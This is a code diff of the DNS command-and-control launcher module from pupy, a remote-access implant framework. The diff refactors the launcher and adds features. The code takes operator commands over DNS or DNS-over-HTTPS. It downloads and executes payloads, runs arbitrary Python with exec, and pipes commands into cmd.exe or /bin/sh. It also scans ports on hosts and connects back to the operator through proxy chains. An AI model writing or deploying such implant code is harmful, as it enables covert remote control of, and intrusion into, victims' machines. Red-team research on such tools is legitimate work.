@@ -1,65 +1,93 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)
 
-from ..base_launcher import *
-from ..picocmd import *
+__all__ = ['DNSCommandClientLauncher']
 
-from ..proxies import get_proxies
-from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
-from ..clients import PupyTCPClient, PupySSLClient
-from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
+from ..picocmd.client import DnsCommandsClient
+from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort
 
-from threading import Thread, Event, Lock
+from ..proxies import find_proxies_for_transport, connect_client_with_proxy_info
+from ..utils import create_client_transport_info_for_addr, HostInfo
+
+from ..socks import ProxyError
+
+from ..online import PortQuiz, check
+from ..scan import scan
+
+from threading import Thread, Lock
+
+from time import sleep
 
 import socket
 import os
 
-import logging
 import subprocess
 
+import tempfile
+import platform
+
+import pupy
+from network.lib import getLogger
+
+logger = getLogger('dnscnc')
+
+
 class DNSCommandClientLauncher(DnsCommandsClient):
-    def __init__(self, domain):
+    def __init__(self, domain, doh=False, ns=None, qtype=None, ns_timeout=3):
         self.stream = None
         self.commands = []
         self.lock = Lock()
-        self.new_commands = Event()
+        self.doh = doh
 
         try:
-            from pupy_credentials import DNSCNC_PUB_KEY
-            key = DNSCNC_PUB_KEY
-        except:
+            import pupy_credentials
+            key = pupy_credentials.DNSCNC_PUB_KEY_V2
+        except ImportError:
             from pupylib.PupyCredentials import Credentials
             credentials = Credentials()
-            key = credentials['DNSCNC_PUB_KEY']
+            key = credentials['DNSCNC_PUB_KEY_V2']
 
-        DnsCommandsClient.__init__(self, domain, key=key)
+        DnsCommandsClient.__init__(
+            self, domain, key, doh, ns, qtype, ns_timeout=ns_timeout
+        )
 
     def on_session_established(self):
-        import pupy
-        if hasattr(pupy, 'infos'):
-            pupy.infos['spi'] = '{:08x}'.format(self.spi)
+        pupy.client.set_info('spi', '{:08x}'.format(self.spi))
 
     def on_session_lost(self):
-        import pupy
-        if hasattr(pupy, 'infos'):
-            del pupy.infos['spi']
+        pupy.client.unset_info('spi')
 
     def on_downloadexec_content(self, url, action, content):
         self.on_pastelink_content(url, action, content)
 
     def on_pastelink_content(self, url, action, content):
         if action.startswith('exec'):
-            with tempfile.NamedTemporaryFile() as tmp:
+            tmp_path = None
+
+            try:
+                fd, tmp_path = tempfile.mkstemp()
+                tmp = os.fdopen(fd, 'wb')
                 tmp.write(content)
-                tmp.flush()
+                tmp.close()
+
                 if not platform.system == 'Windows':
-                    os.chmod(tmp.name, 0700)
-                subprocess.check_output(tmp.name, stderr=subprocess.STDOUT)
+                    os.chmod(tmp_path, 0700)
+
+                os.system(tmp_path)
+
+            except Exception as e:
+                logger.exception(e)
+
+            finally:
+                if tmp_path:
+                    os.unlink(tmp_path)
+
         elif action.startswith('pyexec'):
             try:
                 exec content
             except Exception as e:
-                logging.exception(e)
+                logger.exception(e)
         elif action.startswith('sh'):
             try:
                 pipe = None
@@ -78,7 +106,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                             'startupinfo': startupinfo,
                         })
 
-                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
+                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                 else:
                     pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)
 
@@ -87,23 +115,67 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                 pipe.communicate()
 
             except Exception as e:
-                logging.exception(e)
+                logger.exception(e)
 
-    def on_checkconnect(self, host, port_start, port_end=None):
-        pass
+    def _checkconnect_worker(self, host, port_start, port_end):
+        ports = xrange(port_start, port_end+1)
+        connectable = scan([str(host)], ports)
+        while connectable:
+            chunk = [x[1] for x in connectable[:5]]
+            connectable = connectable[5:]
+            self.event(ConnectablePort(host, chunk))
 
-    def on_connect(self, ip, port, transport, proxy=None):
-        logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
+    def on_checkconnect(self, host, port_start, port_end):
+        worker = Thread(target=self._checkconnect_worker, args=(
+            host, port_start, port_end))
+        worker.daemon = True
+        worker.start()
+
+    def _checkonline_worker(self):
+        logger.debug('CheckOnline worker started')
+        portquiz = PortQuiz()
+        portquiz.start()
+
+        try:
+            offset, mintime, register = check()
+            logger.debug('OnlineStatus completed: %04x %04x %08x',
+                offset, mintime, register)
+            self.event(OnlineStatus(offset, mintime, register))
+        except Exception, e:
+            logger.exception('Online status check failed: %s', e)
+
+        logger.debug('Wait for PortQuiz completion')
+        portquiz.join()
+        logger.debug('PortQuiz completed')
+
+        try:
+            if portquiz.available:
+                self.event(PortQuizPort(portquiz.available[:8]))
+        except Exception, e:
+            logger.exception(e)
+
+        logger.debug('CheckOnline worker completed')
+
+    def on_checkonline(self):
+        worker = Thread(target=self._checkonline_worker)
+        worker.daemon = True
+        worker.start()
+
+    def on_connect(self, address, port, transport, proxy, hostname=None):
+        logger.debug(
+            'connect request: %s:%s %s %s%s',
+            address, port, transport, proxy, (' host=' + hostname) if hostname else ''
+        )
+
         with self.lock:
             if self.stream and not self.stream.closed:
-                logging.debug('ignoring connection request. stream = {}'.format(self.stream))
+                logger.debug('ignoring connection request. stream = %s', self.stream)
                 return
 
-            self.commands.append(('connect', ip, port, transport, proxy))
-            self.new_commands.set()
+            self.commands.append(('connect', address, port, transport, proxy, hostname))
 
     def on_disconnect(self):
-        logging.debug('disconnect request [stream={}]'.format(self.stream))
+        logger.debug('disconnect request [stream=%s]', self.stream)
         with self.lock:
             if self.stream:
                 self.stream.close()
@@ -119,18 +191,43 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
 
-    credentials = [ 'DNSCNC_PUB_KEY' ]
+    name = 'dnscnc'
+    credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
-        self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
+        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
+        self.dnscnc = None
+        self.exited = False
+        self.doh = False
 
-    def init_argparse(self):
-        self.arg_parser = LauncherArgumentParser(
-            prog='dnscnc', description=self.__doc__
+    def parse_args(self, args):
+        self.args = self.arg_parser.parse_args(args)
+
+        self.doh = self.args.doh
+        self.ns = self.args.ns
+        self.ns_timeout = self.args.ns_timeout
+        self.qtype = self.args.qtype
+
+    def activate(self):
+        if self.args is None:
+            raise LauncherError('parse_args needs to be called before iterate')
+
+        logger.info('Activating CNC protocol. Domain: %s', self.args.domain)
+
+        self.pupy = __import__('pupy')
+        self.dnscnc = DNSCommandClientLauncher(
+            self.args.domain, self.doh, self.ns, self.qtype, self.ns_timeout)
+        self.dnscnc.daemon = True
+        self.dnscnc.start()
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = LauncherArgumentParser(
+            prog='dnscnc', description=cls.__doc__
         )
 
-        self.arg_parser.add_argument(
+        cls.arg_parser.add_argument(
             '--domain',
             metavar='<domain>',
             required=True,
@@ -138,140 +235,166 @@ class DNSCncLauncher(BaseLauncher):
                'you should properly setup NS first. Port is NOT supported)'
         )
 
-    def parse_args(self, args):
-        self.args = self.arg_parser.parse_args(args)
-        self.set_host(self.args.domain)
-        self.set_transport(None)
-
-    def try_direct_connect(self, command):
-        _, host, port, transport, _ = command
-        t = network.conf.transports[transport](
-            bind_payload=self.connect_on_bind_payload
+        cls.arg_parser.add_argument(
+            '--ns', help='DNS server (will use internal DNS library)'
         )
 
-        client = t.client()
-        s = None
-        stream = None
+        cls.arg_parser.add_argument(
+            '--doh', help='Use DNS-over-HTTPS', default=False, action='store_true'
+        )
 
-        try:
-            s = client.connect(host, port)
-            stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-        except socket.error as e:
-            logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
-                host, port, transport, e
-            ))
+        cls.arg_parser.add_argument(
+            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
+            default=3, type=int,
+        )
 
-        except Exception, e:
-            logging.exception(e)
-
-        return stream
-
-    def try_connect_via_proxy(self, command):
-        _, host, port, transport, connection_proxy = command
-        if connection_proxy is True:
-            connection_proxy = None
-
-        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
-               additional_proxies=[connection_proxy] if connection_proxy else None
-        ):
-            t = network.conf.transports[transport](
-                bind_payload=self.connect_on_bind_payload
-            )
-
-            if t.client is PupyTCPClient:
-                t.client = PupyProxifiedTCPClient
-            elif t.client is PupySSLClient:
-                t.client = PupyProxifiedSSLClient
-            else:
-                return
-
-            s = None
-            stream = None
-
-            proxy_addr, proxy_port = proxy.rsplit(':', 1)
-
-            try:
-                client = t.client(
-                    proxy_type=proxy_type.upper(),
-                    proxy_addr=proxy_addr,
-                    proxy_port=proxy_port,
-                    proxy_username=proxy_username,
-                    proxy_password=proxy_password
-                )
-
-                s = client.connect(host, port)
-                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-
-            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
-                if proxy_username and proxy_password:
-                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
-                else:
-                    proxy_auth = ''
-
-                logging.error('Couldn\'t connect to {}:{} transport: {} '
-                                  'via {}://{}{}: {}'.format(
-                    host, port, transport,
-                    proxy_type, proxy_auth, proxy,
-                    e
-                ))
-
-            except Exception, e:
-                logging.exception(e)
-
-            yield stream
+        cls.arg_parser.add_argument(
+            '--qtype',
+            choices=['A', 'AAAA'], default=None,
+            help='DNS query type (For now only A and AAAA are supported)'
+        )
 
 
     def iterate(self):
-        import pupy
+        if not self.dnscnc:
+            self.activate()
 
-        if self.args is None:
-            raise LauncherError('parse_args needs to be called before iterate')
+        while not self.exited and not pupy.client.terminated:
+            try:
+                connection = self.process()
+                if not connection:
+                    continue
 
-        dnscnc = DNSCommandClientLauncher(self.host)
-        dnscnc.daemon = True
+                stream, transport = connection
+                if not stream:
+                    continue
 
-        logging.info('Activating CNC protocol. Domain: {}'.format(self.host))
-        dnscnc.start()
+                logger.debug('stream created, yielding - %s', stream)
 
-        exited = False
+                self.dnscnc.stream = stream
 
-        while not exited:
-            command = None
+                yield stream
 
-            with dnscnc.lock:
-                if dnscnc.commands:
-                    command = dnscnc.commands.pop()
-                else:
-                    dnscnc.new_commands.clear()
+                with self.dnscnc.lock:
+                    logger.debug('stream completed - %s', stream)
+
+                    self.dnscnc.stream = None
+
+            except Exception, e:
+                logger.exception(e)
+
+    def process(self):
+        command = None
+        connection = None
+        wait = False
+
+        with self.dnscnc.lock:
+            if self.dnscnc.commands:
+                command = self.dnscnc.commands.pop()
 
             if not command:
-                dnscnc.new_commands.wait()
-                continue
+                wait = True
 
-            if command[0] == 'connect':
-                logging.debug('processing connection command')
+            elif command[0] == 'connect':
+                try:
+                    connection = self.on_connect(command)
+                except socket.error:
+                    pass
 
-                with dnscnc.lock:
-                    if command[4]:
-                        stream = None
-                    else:
-                        stream = self.try_direct_connect(command)
+                if not connection:
+                    self.event(0x20000000 | 0xFFFE)
 
-                    if not stream:
-                        for stream in self.try_connect_via_proxy(command):
-                            if stream:
-                                break
+        if wait:
+            sleep(5)
 
-                    dnscnc.stream = stream
+        return connection
 
-                if stream:
-                    logging.debug('stream created, yielding - {}'.format(stream))
-                    pupy.infos['transport'] = command[3]
+    def connect_to_host(self, host_info, transport, proxies):
+        logger.info('connecting to %s:%d (hostname=%s) using transport %s ...',
+            host_info.host, host_info.port, host_info.hostname,
+            transport
+        )
 
-                    yield stream
+        transport_info = create_client_transport_info_for_addr(
+            transport, host_info
+        )
 
-                    with dnscnc.lock:
-                        dnscnc.stream = None
+        logger.info('using client options: %s', transport_info.client_args)
+        logger.info('using transports options: %s', transport_info.transport_args)
 
-                else:
-                    logging.debug('all connection attempt has been failed')
+        auto = True
+
+        if proxies is False:
+            auto = False
+            proxies = None
+        elif proxies is True:
+            proxies = None
+
+        proposed_proxy_infos = find_proxies_for_transport(
+            transport_info, host_info,
+            wan_proxies=proxies,
+            auto=auto
+        )
+
+        for proxy_info in proposed_proxy_infos:
+            try:
+                yield connect_client_with_proxy_info(
+                    transport_info, proxy_info)
+
+            except (ProxyError, EOFError) as e:
+                logger.info(
+                    'Connection to %s:%d using %s failed: %s',
+                    host_info.host, host_info.port, proxy_info.chain, e
+                )
+            except Exception as e:
+                logger.exception(e)
+
+
+    def on_connect(self, command):
+        logger.debug('processing connection command')
+
+        stream = None
+        transport = None
+
+        _, host, port, transport, connection_proxy, hostname = command
+
+        if connection_proxy is None:
+            logger.debug('Connection proxy: autodetect')
+        elif connection_proxy is True:
+            logger.debug('Connection proxy: omit direct')
+        elif connection_proxy is False:
+            logger.debug('Connection proxy: disabled')
+        elif len(connection_proxy) == 1:
+            logger.debug('Connection proxy: one: %s', connection_proxy[0])
+        else:
+            logger.debug('Connection proxy: chain: %s', connection_proxy)
+
+        host_info = HostInfo(host, port, hostname)
+
+        streams_iterator = self.connect_to_host(
+            host_info, transport, connection_proxy)
+
+        while True:
+            try:
+                stream = next(streams_iterator)
+                break
+
+            except EOFError as e:
+                logger.info('Connection closed: %s', e)
+
+            except StopIteration:
+                break
+
+            except Exception as e:
+                logger.exception(e)
+
+        if stream:
+            self.set_connection_info(hostname, host, port, connection_proxy, transport)
+        else:
+            logger.debug('All connection attempt has been failed')
+            self.reset_connection_info()
+
+        return stream, transport
+
+    def get_transport(self):
+        return self._current_transport
